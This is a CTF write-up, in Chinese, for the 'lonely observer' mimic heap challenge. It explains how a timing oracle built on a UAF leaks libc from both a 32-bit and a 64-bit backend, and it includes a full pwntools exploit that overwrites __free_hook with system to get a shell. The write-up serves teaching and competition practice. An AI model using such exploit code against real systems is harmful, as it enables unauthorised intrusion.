# lonely observer

## 题目简述

题目是一个带拟态裁决机制的堆题，后端同时运行 32 位和 64 位版本，要求两个后端输出保持一致。程序本身有 note 管理功能和 UAF，但传统 heap pwn 需要泄露 libc base，直接让两个后端同时命中 getshell 概率很低。关键机制是 `edit` 中按 note 记录的 `size` 循环单字节读取，若劫持 list 指向伪造结构体，就能让两个后端在同一输入阶段阻塞时间不同，从而在输出一致的约束下做类似时间盲注的 libc 泄露。

题目资料地址：https://github.com/M-Cosmosss/D3CTF-lonely_observer

核心源码包括 `lonely_observer.c`、`mimic.c`、`mimic32` 和 `mimic64`。裁决进程同时 fork 两个后端，`recv_check()` 只对两个输出缓冲区的前缀做 `memcmp` 并向用户回显相同内容，不比较响应时间；`mimic.c` 中 `delete` 只 `free(list[idx]->ptr)`，没有释放或清空 `list[idx]` 结构体，`edit` 又继续使用结构体里的 `size/ptr`。这正好形成 UAF 伪造结构体和时间盲注 leak 的基础。

## 解题过程

抛开拟态的话，题目本身是个功能一应俱全还有UAF的终极弱鸡堆题。而关于拟态heap，之前也有过静态编译的题目，利用32位和64位bin数组的大小划分不同，也可以分别攻击两个后端然后同时getshell。

而这题如果按照常规堆题的思路，想要全程不需要leak出libcbase就能getshell的方法，单64位后端也需要1/4096的概率exp，更别说双后端的情况。因此若要按照传统拟态思路让双后端同时getshell的话，leak出libcbase是必须的。

在输入和输出必须相同的情况下leak，在本题中是采用了一种类似时间盲注的方法，简单描述一下过程：

add一个新的note时，会malloc一个0x10大小的chunk，然后将note的size与地址ptr存入其中，并且bss上只存储了这个记录用chunk的地址数组list。

edit时，将list指向的结构体中存放的size与ptr传参给read\_n函数，在其中循环单字符读取直到读取数量等于size或者遇到换行符。

以上看起来都很常规，但是时间盲注的基本条件已经达成了。劫持list，将其错位指向一个libc地址,举个例子：

```python
ff ff ff ff ff 7f 00 00   00 00 00 00 00 aa aa aa   aa
```

让list中的地址指向0x7f的位置，这样这个fake struct的内容就是size=0x7f,ptr=0xaaaaaaaa(将其设为一个可写的地址即可)

同时用一样的方法，让另一个后端的同index指向的fake struct的size=0x1，ptr可写

然后通过不断的send单个字符，只有当第一个后端也完成edit后才会出现回显，而出现回显时send的字符总数即为0x7f，从而可以逐字节爆破libcbase

这也涉及到本题裁决机的具体实现机制，对两个后端的输出并没有时间上的限制，只要输出的内容一直保持一致就能通过

所以这还涉及到一个问题，另一个后端在提前edit完成后，如果输入缓冲区不够大，比如pwn题中常见的自定义函数read\_int（缓冲区一般都设置在0x10－0x20以内），在接着send的过程中每当缓冲区满了，就会输出一次”invalid choice”或者menu，从而导致双后端输出不一致。但本题读取menu选项使用的是scanf，缓冲区够大的同时也不需要手动设置一个0xff大的缓冲区引起怀疑=-=

至此，时间盲注的所有条件已经达成，剩下的只是构造问题了，方法很多，可以参照示例exp。在得到libcbase后，同时getshell也不再是难题，示例exp中是分别修改两个后端的free\_hook为system后dele同一个存放着/bin/sh的note。

---

以上就是预期解法了。有些遗憾的是在比赛中这是仅有的一道没出现预期解的pwn，唯一的一解非预期来自北极星的Ex师傅，直接爆破32位后端的libcbase，通过反弹shell绕过裁决机的限制从而cat flag。这个非预期依赖 32 位 Linux 进程地址空间小、共享库映射随机化熵较低的特点：libc 基址只在有限页对齐候选中变化，实际爆破空间远小于 64 位场景，所以远程多次尝试可以碰撞成功。

Null 和 0ops 的师傅们也想到了利用 32 位 ASLR 薄弱性直接命令执行的思路，但实际爆破大量次数后仍未成功，说明该非预期路径对环境和 payload 细节仍然敏感。

时间盲注只是破解拟态leak限制的一种理论方法，实际上本题解法可能不具有多少普适性，但是为了让时间盲注可行的同时在题目中不露出刻意为之的痕迹，还是花费了一番心思的233，这其中主要感谢Aris的大量帮助。个人认为这题最有意思的部分在于，它看起来就像是一道普通的heap pwn=。=

```python
from pwn import *
import time 
# context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 1
t64 = 0
# binary_name = 'mimic64'

if local:
    if t64 == 1:
        cn = process('./mimic64')
    elif t64 == 2:
        cn = process('./mimic32')
    else:
        cn = process('./lonely_observer')
else:
    cn = remote('',)
    #libc = ELF('')

ru = lambda x : cn.recvuntil(x)
sn = lambda x : cn.send(x)
rl = lambda   : cn.recvline()
sl = lambda x : cn.sendline(x)
rv = lambda x : cn.recv(x)
sa = lambda a,b : cn.sendafter(a,b)
sla = lambda a,b : cn.sendlineafter(a,b)

# bin = ELF('./'+binary_name,checksec=False)
# 比赛中远程环境的libc32和常见的2.23有一些差别，调试时需要注意

libc64 = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
libc32 = ELF('/lib/i386-linux-gnu/libc-2.23.so',checksec=False)

def z(a=''):
    gdb.attach(cn,a)
    if a == '':
        raw_input()

def add(idx,sz,con='a'):
    sla('>>','1')
    sla('index?',str(idx))
    sla('size?',str(sz))
    sa('content:',con)

def dele(idx):
    sla('>>','2')
    sla('index?',str(idx))

def show(idx):
    sla('>>','3')
    sla('index?',str(idx))

def edit(idx,con):
    sla('>>','4')
    sla('index?',str(idx))
    sa('content:',con)

time_start = time.time()

list64 = 0x602060
bss64 = 0x602060+0x10*0x30
list32 = 0x804b060
bss32 = 0x804b060+8*0x30

add(0,1)
add(1,1)
add(2,1)
dele(0)
dele(1)
edit(1,'\x00')
add(3,0x10,p64(0x1000)+p64(list64+8*4))
dele(2)
edit(2,'\x00')
add(4,8,p32(0x1000)+p32(list32+4*8))
dele(2)
edit(2,'\x00')

lbase64 = 0
for idx in range(5,0,-1):
    buf = p32(list32+4*10) + p32(list32+4*12)
    buf+= p32(1) + p32(bss32)#8
    buf+= p32(0x100) + p32(bss32+0x100)#9
    buf = buf.ljust(4*8,'\x00')

    buf+= p64(0x602040+idx) + p64(list64+8*12)
    buf+= p64(0) + p64(0)#8
    buf+= p64(0x100) + p64(0x602041+idx)#9
    buf+= 'n'
    sl('4')
    sla('index?','0')
    sa('content:',buf)
    edit(9,'\x00'*7 + p64(bss64) + '\n')

    sla('>>','4')
    sla('index?','8')
    for sz in range(1,256):
        print('sz:'+str(sz))
        sn('5')
        if 'done!' in cn.recvrepeat(0.1):
            lbase64 += sz << (idx*8)
            success(hex(sz))
            sl('5'*(0x100-sz))
            break
        elif sz == 0xff:
            print('failed')
            exit(0)
lbase64 -= libc64.sym['_IO_2_1_stderr_']&~0xff

lbase32 = 0
for idx in range(3,0,-1):
    buf = p32(0x804b020+idx) + p32(list32+4*12)
    buf+= p32(0) + p32(0)#8
    buf+= p32(0x100) + p32(0x804b021+idx)#9
    buf = buf.ljust(4*8,'\x00')

    buf+= p64(list64+8*10) + p64(list64+8*12)
    buf+= p64(1) + p64(bss64)#8
    buf+= p64(0x100) + p64(bss64+0x100)#9
    buf+= 'n'
    sl('4')
    sla('index?','0')
    sa('content:',buf)
    edit(9,'\x00'*3 + p32(bss32) + '\n')

    sla('>>','4')
    sla('index?','8')
    for sz in range(1,256):
        print('sz:'+str(sz))
        sn('5')
        if 'done!' in cn.recvrepeat(0.1):
            lbase32 += sz << (idx*8)
            success(hex(sz))
            sl('5'*(0x100-sz))
            break
        elif sz == 0xff:
            print('failed')
            exit(0)
lbase32 -= libc32.sym['_IO_2_1_stderr_']&~0xff
success('lbase64:'+hex(lbase64))
success('lbase32:'+hex(lbase32))

buf = p32(list32+4*10) + p32(list32+4*12)
buf+= p32(4) + p32(lbase32+libc32.sym['__free_hook'])#8
buf+= p32(8) + p32(bss32)#9
buf = buf.ljust(4*8,'\x00')

buf+= p64(list64+8*10) + p64(list64+8*12)
buf+= p64(4) + p64(bss64)#8
buf+= p64(8) + p64(lbase64+libc64.sym['__free_hook'])#9
buf+= 'n'
edit(0,buf)
edit(8,p32(lbase32+libc32.sym['system']))
edit(9,p64(lbase64+libc64.sym['system']))
add(0x20,0x20,'/bin/shn')
dele(0x20)

time_end = time.time()

print('[*]totally cost:'+str(time_end-time_start))

cn.interactive()
```

## 方法总结

- 核心技巧：拟态裁决只比较输出内容而不限制输出时间时，可以用输入阻塞制造 timing oracle，在不直接打印地址的情况下逐字节泄露 libc。
- 识别信号：双后端拟态、输入输出必须一致、存在可劫持的结构体指针和按 size 读取的 edit 功能时，应检查能否让一个后端先完成、另一个后端继续阻塞。
- 复用要点：这种利用依赖裁决机是否允许时间差、菜单读取缓冲区是否足够大、两个后端的数据结构偏移是否可分别布置；拿到两个 libc base 后再分别改 `__free_hook` 为 `system`，最后对同一 `/bin/sh` note 执行 delete。

